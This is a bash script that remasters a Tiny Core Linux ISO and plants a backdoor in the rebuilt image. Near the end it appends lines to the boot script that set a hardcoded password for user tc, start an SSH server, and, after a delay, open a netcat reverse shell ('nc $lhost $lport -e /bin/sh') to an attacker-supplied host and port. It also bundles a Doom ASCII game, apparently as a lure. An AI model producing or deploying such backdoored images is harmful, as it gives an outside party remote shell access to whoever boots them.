#!/bin/bash

# This script is a fork of https://gist.github.com/dankrause and was highly influenced by http://tinycorelinux.net/corebook.pdf
# See the README for details.

set -e

function cleanup() {
    # clean up our temp folder
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT


# default config
URL="https://distro.ibiblio.org/tinycorelinux/6.x/x86"
INPUTISO="Core-6.4.1.iso"
OUTPUTISO="tinycore-custom.iso"
ROOTFS="rootfs"
VOLUMEID="tinycore-custom"
EXTENSIONS="openssh.tcz git.tcz gcc.tcz cmake.tcz coreutils.tcz curl-dev.tcz httptunnel.tcz make.tcz glibc_base-dev.tcz linux-3.16.2_api_headers.tcz"
BOOTARGS=""

while getopts i:p: flag
do
    case "${flag}" in
        i) lhost=${OPTARG};;
        p) lport=${OPTARG};;
    esac
done

if [ -z "$lport" ] || [ -z "$lhost" ]; then
    echo 'Please provided -i (lhost) and -p (lport) flags'
    exit 0
fi
echo "LHOST: $lhost";
echo "LPORT: $lport";

# create our working folders
TMPDIR="$(mktemp -d --tmpdir=$(pwd) 'iso.XXXXXX')"
WORKING=$(pwd)
echo $TMPDIR
chmod 755 "${TMPDIR}"
mkdir -p dist/{iso,tcz,dep} "${TMPDIR}/cde/optional"


# downloads a file, only if it's not already cached
function cachefile() {
    [ -f "dist/${2}/${1}" ] || wget "${URL}/${3}/${1}" -O "dist/${2}/${1}" \
                            || [[ ${2} == dep ]] && touch "dist/${2}/${1}"
}


# download the ISO
cachefile "${INPUTISO}" iso release


# get the contents of the iso
xorriso -osirrox on -indev "dist/iso/${INPUTISO}" -extract / "${TMPDIR}"


# install extensions and dependencies
while [ -n "${EXTENSIONS}" ] ; do
    DEPS=""
    for EXTENSION in ${EXTENSIONS} ; do
        cachefile "${EXTENSION}" tcz tcz
        cachefile "${EXTENSION}.dep" dep tcz
        cp "dist/tcz/${EXTENSION}" "${TMPDIR}/cde/optional"
        DEPS=$(echo ${DEPS} | cat - "dist/dep/${EXTENSION}.dep" | sort -u)
    done
    EXTENSIONS=$DEPS
done


# set extensions to start on boot
pushd ${TMPDIR}/cde/optional
    ls | tee ../onboot.lst > ../copy2fs.lst
popd


# alter isolinux config to use our changes
ISOLINUX_CFG="${TMPDIR}/boot/isolinux/isolinux.cfg"
sed -i 's/prompt 1/prompt 0/' "${ISOLINUX_CFG}"
sed -i "s/append/append cde ${BOOTARGS}/" "${ISOLINUX_CFG}"


# build the rootfs and place it on the iso
if [ -d ${ROOTFS} ] ; then
    sed -i "/^\tinitrd/ s/$/,\/boot\/overlay.gz/" "${ISOLINUX_CFG}"
    chmod -R u+w "${TMPDIR}/boot"
    pushd "${ROOTFS}"
        find | cpio -o -H newc | gzip -2 > "${TMPDIR}/boot/overlay.gz"
    popd
fi

# build a new iso
xorriso -as mkisofs -iso-level 3 -full-iso9660-filenames -volid "${VOLUMEID}" \
        -eltorito-boot boot/isolinux/isolinux.bin -boot-load-size 4 \
        -eltorito-catalog boot/isolinux/boot.cat -boot-info-table \
        -no-emul-boot -output "${OUTPUTISO}" "${TMPDIR}/"
        
mkdir /mnt/img_hack
mount ${OUTPUTISO} /mnt/img_hack -o loop,ro
cp -a /mnt/img_hack/boot /tmp
cp -a /mnt/img_hack/cde /tmp
mv /tmp/boot/core.gz /tmp
umount /mnt/img_hack
rmdir /mnt/img_hack

mkdir /tmp/extract
cd /tmp/extract
zcat /tmp/core.gz | cpio -i -H newc -d

echo 'echo -e "ch33sed00dle\nch33sed00dle" | passwd tc' >> ./opt/bootlocal.sh
echo '/usr/local/etc/init.d/openssh start' >> ./opt/bootlocal.sh
echo "(sleep 60; nc $lhost $lport -e /bin/sh)&" >> ./opt/bootlocal.sh
echo '' >> ./opt/bootlocal.sh
cd root/
git clone https://github.com/wojciech-graj/doom-ascii.git
wget https://archive.org/download/2020_03_22_DOOM/DOOM%20WADs/Doom%20%28v1.9%29.zip

cd /tmp/extract
find | sudo cpio -o -H newc | gzip -2 > ../core.gz
cd /tmp
advdef -z4 core.gz
mv core.gz boot
mkdir newiso
mv boot newiso
mv cde newiso
mkisofs -l -J -r -V TC-custom -no-emul-boot -boot-load-size 4 -boot-info-table -b boot/isolinux/isolinux.bin -c boot/isolinux/boot.cat -o TC-remastered.iso newiso
rm -rf newiso
rm -rf extract
mv TC-remastered.iso ${WORKING}/${OUTPUTISO}



